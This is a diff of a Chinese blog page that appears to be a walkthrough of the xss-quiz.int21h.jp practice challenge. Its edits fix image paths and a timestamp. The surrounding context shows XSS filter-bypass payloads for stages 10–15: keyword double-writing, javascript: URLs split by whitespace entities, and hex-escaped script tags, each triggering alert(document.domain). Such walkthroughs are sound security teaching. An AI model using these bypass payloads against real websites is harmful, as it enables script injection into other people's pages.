@@ -532,18 +532,18 @@
 <p>这里的utf-7 现在的浏览器已经移除了这种编码，危害较小</p>
 <p>所以这里取巧：</p>
 <p><img src="/images/xss_stage9.png" alt></p>
-<p><img src="..%5Cimages%5Cxss_stage9_1.png" alt></p>
-<p><img src="..%5Cimages%5Cxss_stage9_2.png" alt></p>
+<p><img src="/images/xss_stage9_1.png" alt></p>
+<p><img src="/images/xss_stage9_2.png" alt></p>
 <p>或者 点击跳过这关</p>
-<p><img src="%5Cimages%5Cxss_stage.png" alt></p>
+<p><img src="/images/xss_stage.png" alt></p>
 <h2 id="绕过过滤domain为空的xss"><a href="#绕过过滤domain为空的xss" class="headerlink" title="绕过过滤domain为空的xss"></a>绕过过滤domain为空的xss</h2><blockquote>
 <p>stage #10 </p>
 <p><a href="http://xss-quiz.int21h.jp/stage00010.php?sid=b86e436416bd0ed72ba8e07ffd237471e7bd006d" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage00010.php?sid=b86e436416bd0ed72ba8e07ffd237471e7bd006d</a></p>
 </blockquote>
-<p><img src="%5Cimages%5Cxss_stage10.png" alt></p>
-<p><img src="%5Cimages%5Cxss_stage10_1.png" alt></p>
-<p><img src="%5Cimages%5Cxss_stage10_2.png" alt></p>
-<p><img src="%5Cimages%5Cxss_stage10_3.png" alt></p>
+<p><img src="/images/xss_stage10.png" alt></p>
+<p><img src="/images/xss_stage10_1.png" alt></p>
+<p><img src="/images/xss_stage10_2.png" alt></p>
+<p><img src="/images/xss_stage10_3.png" alt></p>
 <p>domain被过滤，采取双写，编码绕过</p>
 <p>双写：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">132456</span><span class="string">"&gt;&lt;svg/onload=alert(document.domdomainain)&gt;%0a</span></span><br></pre></td></tr></table></figure>
@@ -558,7 +558,7 @@
 <p>在伪协议中带空格仍然能执行</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">132456</span><span class="string">"&gt;&lt;a href="</span>javasc ript:alert(<span class="built_in">document</span>.domain);<span class="string">"&gt;xss&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="%5Cimages%5Cxss_stage11.png" alt></p>
+<p><img src="/images/xss_stage11.png" alt></p>
 <p>然而，404,空格换一下在script中间插入<code>&amp;#09;</code>，<code>&amp;#10;</code>，空格等不可见字符，让正则匹配不到。</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123"&gt;&lt;a href="javasc&amp;#10;ript:alert(document.domain);"&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
 
@@ -594,8 +594,8 @@
 <p><a href="https://xss-quiz.int21h.jp/stage__15.php?sid=e4954d390fd0e5d6a8dd4d1f3647e7f4095bcf2e" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage__15.php?sid=e4954d390fd0e5d6a8dd4d1f3647e7f4095bcf2e</a></p>
 </blockquote>
 <p>经检测，&lt; &gt; \ 被过滤，&lt; 16进制为3c  &gt;16进制为3e</p>
-<p><img src="%5Cimages%5Cxss_stage15.png" alt></p>
-<p><img src="%5Cimages%5Cxss_stage15_1.png" alt></p>
+<p><img src="/images/xss_stage15.png" alt></p>
+<p><img src="/images/xss_stage15_1.png" alt></p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\x3cscript\\x3ealert(<span class="built_in">document</span>.domain);\\x3c/script\\x3e</span><br></pre></td></tr></table></figure>
 
 <h2 id="Ascii绕过过滤触发xss"><a href="#Ascii绕过过滤触发xss" class="headerlink" title="Ascii绕过过滤触发xss"></a>Ascii绕过过滤触发xss</h2><p>符号 -&gt; ascii</p>
@@ -699,7 +699,7 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2019-08-12T08:50:55+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2019-08-12T09:30:14+08:00">
   <a class='notlink'>
     <i class="fas fa-clock" aria-hidden="true"></i>
     <p>最后更新于 2019年8月12日</p>
